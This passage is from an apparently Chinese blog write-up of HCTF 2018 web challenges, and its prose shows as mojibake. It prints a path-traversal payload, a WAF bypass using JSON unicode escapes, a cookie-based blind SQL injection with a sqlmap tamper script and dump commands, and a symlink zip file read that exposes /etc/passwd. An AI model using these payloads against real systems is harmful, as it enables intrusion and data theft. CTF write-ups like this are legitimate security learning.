class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨äº†ç™½åå•ï¼Œåªæœ‰ source.php å’Œ hint.php æ‰å¯ä»¥ï¼Œä½†æ˜¯å‘ç°æœ‰ä¸ª ? æˆªå–ï¼Œå¯ä»¥æ„é€  payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;source.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>å¯ä»¥ return tureã€‚</p><p>ç„¶ååœ¨ include çš„æ—¶å€™ï¼Œ<code>include(source.php?/../../../../ffffllllaaaagggg)</code> è§£ææ–¹å¼ä¸ºï¼šæŠŠ <code>source.php?</code>å½“ä½œä¸€ä¸ªæ–°çš„æ–‡ä»¶å¤¹ï¼Œå…¶å®æ˜¯æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶å¤¹çš„ï¼Œç„¶ååä¸€ä¸ª <code>../</code> åˆè·³å›äº†å½“å‰ç›®å½•ï¼Œåé¢æ¥ç€ 3 ä¸ª ../ï¼Œæ„æ€å°±æ˜¯å½“å‰ç›®å½•ï¼ˆæºç æ‰€åœ¨ç›®å½•ï¼‰ä¸Šä¸‰çº§æ–‡ä»¶å¤¹ä¸‹æœ‰ä¸ª ffffllllaaaagggg æ–‡ä»¶ï¼Œå¯ä»¥æˆåŠŸè¯»å–ã€‚</p><p>è®¿é—® <a href="http://warmup.2018.hctf.io/?file=source.php?/../../../../ffffllllaaaaggggï¼Œå¾—åˆ°flag">http://warmup.2018.hctf.io/?file=source.php?/../../../../ffffllllaaaaggggï¼Œå¾—åˆ°flag</a></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-096c543a33040113.png" alt="image.png"></p><h3 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h3><p>é¢˜ç›®è¿›å»å°±è·³åˆ° qq ç©ºé—´ç™»é™†ç•Œé¢ï¼Œå‘ç°æºç æ³„éœ² <a href="http://www.zipï¼Œä¸‹è½½ä¸‹æ¥è¿›è¡Œå®¡è®¡ã€‚">www.zipï¼Œä¸‹è½½ä¸‹æ¥è¿›è¡Œå®¡è®¡ã€‚</a></p><p>å‘ç°æœ‰å…¨å±€çš„ wafï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $blacklist = <span class="string">&#x27;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace_callback($blacklist, <span class="function"><span class="keyword">function</span> (<span class="params">$match</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;@&#x27;</span> . $match[<span class="number">0</span>] . <span class="string">&#x27;@&#x27;</span>;</span><br><span class="line">    &#125;, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($string)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            $string[$key] = safe($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $string = waf($string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($value) &amp;&amp; !is_numeric($value)) &#123;</span><br><span class="line">        $value = safe($value);</span><br><span class="line">    &#125;</span><br><span class="line">    $_GET[$key] = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($value) &amp;&amp; !is_numeric($value)) &#123;</span><br><span class="line">        $value = safe($value);</span><br><span class="line">    &#125;</span><br><span class="line">    $_POST[$key] = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_COOKIE <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($value) &amp;&amp; !is_numeric($value)) &#123;</span><br><span class="line">        $value = safe($value);</span><br><span class="line">    &#125;</span><br><span class="line">    $_COOKIE[$key] = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($cplen, $key, $value);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ã€‚</p><p>åœ¨<code>member.php</code> ä¸­ï¼Œå‘ç°æ³¨å…¥ç‚¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!defined(<span class="string">&#x27;IN_CRONLITE&#x27;</span>)) <span class="keyword">exit</span>();</span><br><span class="line">$islogin = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">&quot;islogin&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">&quot;login_data&quot;</span>]) &#123;</span><br><span class="line">        $login_data = json_decode($_COOKIE[<span class="string">&#x27;login_data&#x27;</span>], <span class="literal">true</span>);</span><br><span class="line">        $admin_user = $login_data[<span class="string">&#x27;admin_user&#x27;</span>];</span><br><span class="line">        $udata = $DB-&gt;get_row(<span class="string">&quot;SELECT * FROM fish_admin WHERE username=&#x27;<span class="subst">$admin_user</span>&#x27; limit 1&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ($udata[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            setcookie(<span class="string">&quot;islogin&quot;</span>, <span class="string">&quot;&quot;</span>, time() - <span class="number">604800</span>);</span><br><span class="line">            setcookie(<span class="string">&quot;login_data&quot;</span>, <span class="string">&quot;&quot;</span>, time() - <span class="number">604800</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $admin_pass = sha1($udata[<span class="string">&#x27;password&#x27;</span>] . LOGIN_KEY);</span><br><span class="line">        <span class="keyword">if</span> ($admin_pass == $login_data[<span class="string">&#x27;admin_pass&#x27;</span>]) &#123;</span><br><span class="line">            $islogin = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setcookie(<span class="string">&quot;islogin&quot;</span>, <span class="string">&quot;&quot;</span>, time() - <span class="number">604800</span>);</span><br><span class="line">            setcookie(<span class="string">&quot;login_data&quot;</span>, <span class="string">&quot;&quot;</span>, time() - <span class="number">604800</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;islogin&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">&quot;admin_user&quot;</span>]) &#123;</span><br><span class="line">        $admin_user = base64_decode($_SESSION[<span class="string">&#x27;admin_user&#x27;</span>]);</span><br><span class="line">        $udata = $DB-&gt;get_row(<span class="string">&quot;SELECT * FROM fish_admin WHERE username=&#x27;<span class="subst">$admin_user</span>&#x27; limit 1&quot;</span>);</span><br><span class="line">        $admin_pass = sha1($udata[<span class="string">&#x27;password&#x27;</span>] . LOGIN_KEY);</span><br><span class="line">        <span class="keyword">if</span> ($admin_pass == $_SESSION[<span class="string">&quot;admin_pass&quot;</span>]) &#123;</span><br><span class="line">            $islogin = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° login_data è¿›è¡Œäº† json_decodeï¼Œè¿™æ ·å¯ä»¥æ— è§† waf äº†ã€‚ä¾‹å¦‚è¿‡æ»¤äº† or ï¼Œå¯ä»¥ä½¿ç”¨<code>\u006fr</code> æ¥ç»•è¿‡ã€‚</p><p>æ¯”èµ›çš„æ—¶å€™æ˜¯æ ¹æ®è¿”å›å¤´é‡Œ set-cookie çš„æ•°é‡æ¥è¿›è¡Œå¸ƒå°”ç›²æ³¨ï¼Œè¿™ä¸ªè¯­å¥ï¼š</p><p><code>$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);</code></p><p>å¯ä»¥æ„é€  <code>admin&#39;and/**/0\u0023</code> å’Œ <code>admin&#39;and/**/1\u0023</code>ï¼Œæ¥æ§åˆ¶ä¸‹é¢ <code>$udata[&#39;username&#39;] == &#39;&#39;</code>æ˜¯å¦ä¸ºçœŸï¼Œé€šè¿‡ set-cookie æ•°é‡å¯ä»¥åˆ¤æ–­ã€‚ç”±äºä¸‹é¢è¿™æ¡è¯­å¥ <code>$admin_pass == $login_data[&#39;admin_pass&#39;]</code>ï¼Œè‚¯å®šä¸ºå‡ï¼Œæ‰€ä»¥è‚¯å®šæœ‰ä¸¤ä¸ª set-cookieï¼Œè¿™æ ·å¯ä»¥é€šè¿‡è¿”å›å¤´æ˜¯ä¸¤ä¸ªè¿˜æ˜¯å››ä¸ª set-cookie æ¥å¸ƒå°”ç›²æ³¨ã€‚</p><p>æµ‹è¯•ï¼š</p><p><code>admin&#39;and/**/0\u0023</code>:</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c237f1a9e953320f.png" alt="image.png"></p><p><code>admin&#39;and/**/1\u0023</code>:</p><p>  <img src="https://upload-images.jianshu.io/upload_images/9223743-150fe3ef01a26b70.png" alt="image.png"></p><p>å¯ä»¥æ³¨å…¥ã€‚</p><p>ç„¶åå‘ç°ä¸ç”¨æ³¨å…¥ï¼Œç›´æ¥ç”¨ union æ§åˆ¶æŸ¥è¯¢å‡ºçš„ <code>$udata[&#39;password&#39;]</code>å°±å¯ä»¥ç™»å½•ç®¡ç†å‘˜ï¼Œä½†æ˜¯ç™»å…¥åå°å‘ç°æ²¡æœ‰ getshell çš„ç‚¹ï¼Œå®¡è®¡å‘ç°éƒ½æ˜¯ sql è¯­å¥æ²¡æœ‰ä»€ä¹ˆå¯åˆ©ç”¨çš„ã€‚</p><p>çŒœæµ‹ flag åœ¨æ•°æ®åº“é‡Œï¼Œç„¶åç”¨ç›²æ³¨ä¸€ç‚¹ç‚¹æ³¨å…¥ï¼Œæœ€åè¡¨åæ˜¯ F1444g ï¼Œå­—æ®µåæ˜¯ F1a9 ï¼Œæ³¨å‡ºæ¥ flagã€‚</p><p>èµ›åçœ‹äº†å¤§å¸ˆå‚…ä»¬çš„ wpï¼Œå‘ç°æœ‰å¸ˆå‚…ç›´æ¥è‡ªå·±å†™ tamper è„šæœ¬ç”¨ sqlmap æ³¨å…¥ï¼Œè‡ªå·±ä¹Ÿæ­£å¥½å­¦ä¸€ä¸‹å†™ tamper è„šæœ¬ã€‚</p><p>è¿™é‡Œè´´ä¸Š RR å¸ˆå‚…çš„è„šæœ¬ï¼š</p><p>tamper/hctf.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;&#x27;&#123;&quot;admin_user&quot;:&quot;%s&quot;&#125;;&#x27;&#x27;&#x27;</span></span><br><span class="line">    payload = payload.lower()</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;\u0075&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;\u006f&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;\u0069&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\u0027&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27;\u0022&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\u0020&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;\u0073&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;\u0023&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\u003e&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;\u003c&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;\u002d&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;\u003d&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;f1a9&#x27;</span>, <span class="string">&#x27;F1a9&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;f1&#x27;</span>, <span class="string">&#x27;F1&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data % payload</span><br></pre></td></tr></table></figure><p>å‘½ä»¤ï¼š<code>python sqlmap.py -r a.txt --tamper=hctf --dbms=mysql --thread=10 --dbs</code></p><p>a.txt:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;admin&#x2F;list.php HTTP&#x2F;1.1</span><br><span class="line">Host: kzone.2018.hctf.io</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko&#x2F;20100101 Firefox&#x2F;60.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Referer: http:&#x2F;&#x2F;kzone.2018.hctf.io&#x2F;admin&#x2F;login.php</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Cookie: islogin&#x3D;1;login_data&#x3D;*</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">user&#x3D;admin&amp;pass&#x3D;1&amp;login&#x3D;Login</span><br></pre></td></tr></table></figure><p>æœ€åä¸¤ä¸ª replace æ˜¯å› ä¸ºåé¢æ³¨çš„æ—¶å€™ï¼Œç”±äºå‰é¢<code>payload = payload.lower()</code> éƒ½æ¢æˆäº†å°å†™ï¼Œè¡¨åä¹‹ç±»çš„å°±ä¸å¯¹äº† ï¼Œè¿˜è¦æŠŠä»–ä»¬æ›¿æ¢å›å»ã€‚</p><p>è‡ªå·±åœ¨å¤ç°çš„æ—¶å€™ï¼Œsqlmap æ­»æ´»è·‘ä¸å‡ºï¼Œå‚è€ƒäº†ä¸€å¶é£˜é›¶å¸ˆå‚…çš„ wp æ‰æ„è¯†åˆ°æ˜¯ sqlmap å¯¹äºç›²æ³¨æ­£ç¡®ä¸å¦çš„ä¸åŒé¡µé¢åˆ¤æ–­æœ‰é—®é¢˜ã€‚</p><p>æŒ‰ç…§ä¹‹å‰çš„æ³¨å…¥æ–¹å¼ï¼Œå·®åˆ«ä»…åœ¨å“åº”å¤´ set-cookie çš„æ•°é‡ï¼Œ sqlmap é»˜è®¤åº”è¯¥æ˜¯ä¸èƒ½é€šè¿‡è¿™æ ·çš„æ–¹å¼ç›²æ³¨çš„ï¼Œæ‰€ä»¥ä¸€ç›´ä¸æˆåŠŸã€‚ç„¶åå‘ç°åšé¢˜çš„æ—¶å€™æ¼äº†ä¸€ä¸ªåœ°æ–¹è‡ªå·±æ²¡æœ‰çœ‹åˆ°è¿™ä¸ª <code>$admin_pass == $login_data[&#39;admin_pass&#39;]</code>å¼±ç±»å‹ã€‚  <code>$admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);</code> ä¹Ÿå°±æ˜¯è¯´æ˜¯ä¸ª  sha1 çš„å“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬å¯ä»¥ admin_passä¼ å…¥ä¸€ä¸ªæ•°å­—æ¥å¼±ç±»å‹ç»•è¿‡ï¼Œæ•°å­—åˆ°åº•æ˜¯å¤šå°‘å¯ä»¥çˆ†ç ´ï¼Œçˆ†ç ´åˆ° 65 æˆåŠŸï¼Œè¯æ˜é‚£ä¸ª sha1 çš„å“ˆå¸Œå€¼æ˜¯ 65 å¼€å¤´çš„ã€‚</p><p>ç„¶åå°±å¯ä»¥ç™»è¿›å»äº†ï¼Œè¿™æ ·çš„è¯ç›²æ³¨å°±å˜æˆäº†æ­£ç¡®æ—¶æ˜¯æˆåŠŸç™»é™†ï¼Œé”™è¯¯ä¸¤ä¸ª set-cookieã€‚æˆ‘ä»¬ç°åœ¨å¯ä»¥é€šè¿‡ sqlmap çš„æŒ‡å®šé€‰é¡¹ <code>--not-string=window.location</code>æ¥æ³¨å…¥äº†ï¼Œå‘Šè¯‰ sqlmap ç›²æ³¨é”™è¯¯è¿”å›çš„é¡µé¢å«æœ‰ <code>window.location</code>ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬æŠŠ temper è„šæœ¬æ”¹ä¸º <code>data = &#39;&#39;&#39;&#123;&quot;admin_user&quot;:&quot;admin%s&quot;,&quot;admin_pass&quot;:65&#125;;&#39;&#39;&#39;</code>ï¼Œç„¶åå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r a.txt --tamper&#x3D;hctf --dbms&#x3D;mysql --thread&#x3D;10 --technique&#x3D;B --not-string&#x3D;window.location -dbs</span><br></pre></td></tr></table></figure><p>â€“technique=B æŒ‡å®šæ³¨å…¥ä¸º Bool ç›²æ³¨, å‘ç°æ³¨å‡ºäº†æ•°æ®åº“ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-db3a1da3ba2543c4.png" alt="image.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯æ³¨è¡¨åï¼Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r a.txt --tamper&#x3D;hctf --dbms&#x3D;mysql --thread&#x3D;10 --technique&#x3D;B --not-string&#x3D;window.location -D hctf_kouzone --tables</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-13df79edfc233129.png" alt="image.png"></p><p>æ³¨å­—æ®µåï¼Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r a.txt --tamper&#x3D;hctf --dbms&#x3D;mysql --thread&#x3D;10 --technique&#x3D;B --not-string&#x3D;window.location -D hctf_kouzone -T F1444g --columns</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f4ebb34447e4ece8.png" alt="image.png"></p><p>æœ€åæ³¨flagï¼Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r a.txt --tamper&#x3D;hctf --dbms&#x3D;mysql --thread&#x3D;10 --technique&#x3D;B --not-string&#x3D;window.location -D hctf_kouzone -T F1444g -C F1a9 --dumps</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f23c07976a0a9897.png" alt="image.png"></p><p>å¦å¤–ï¼Œå‘ç°æ³¨å…¥ç‚¹ä¹Ÿå¯ä»¥ä¸ç”¨å¸ƒå°”ç›²æ³¨ï¼Œé‡‡ç”¨æ—¶é—´ç›²æ³¨ï¼Œå°±æ²¡æœ‰å¸ƒå°”ç›²æ³¨æ­£ç¡®ä¸é”™è¯¯çš„æƒ…å†µ sqlmap èƒ½å¦è¯†åˆ«çš„é—®é¢˜äº†ã€‚å¯ä»¥æ³¨å‡ºæ¥ä½†æ˜¯æ•ˆç‡å°±ä½äº†ï¼Œsqlmap å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r a.txt --tamper&#x3D;hctf --dbms&#x3D;mysql --thread&#x3D;10 --technique&#x3D;T</span><br></pre></td></tr></table></figure><h3 id="handandseek"><a href="#handandseek" class="headerlink" title="handandseek"></a>handandseek</h3><p>ä¸Šä¼  zip æ–‡ä»¶ï¼Œæƒ³åˆ°è½¯è¿æ¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯¦æƒ…å¯è§ï¼š<a href="http://www.vuln.cn/8132}">http://www.vuln.cn/8132</a> </p><p>ä¸¤ä¸ªå‘½ä»¤: <code>ln -s è¦è¯»çš„æ–‡ä»¶å é“¾æ¥å</code>ï¼Œ<code>zip -y å‹ç¼©åŒ…å é“¾æ¥å</code></p><p>å¯ä»¥ç”¨ python å†™ä¸€ä¸ªå°çš„ç”Ÿæˆå™¨ï¼Œé¿å…æ¯æ¬¡è¯»éƒ½è¦è¾“å‘½ä»¤ã€‚</p><p>å¯ä»¥è¯» /etc/passwdï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">nginx:x:101:102:nginx user,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:102:103::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>è¯»ä¸€ä¸‹ /proc/self/environ ï¼Œå‘ç°äº†æœ‰ç”¨çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 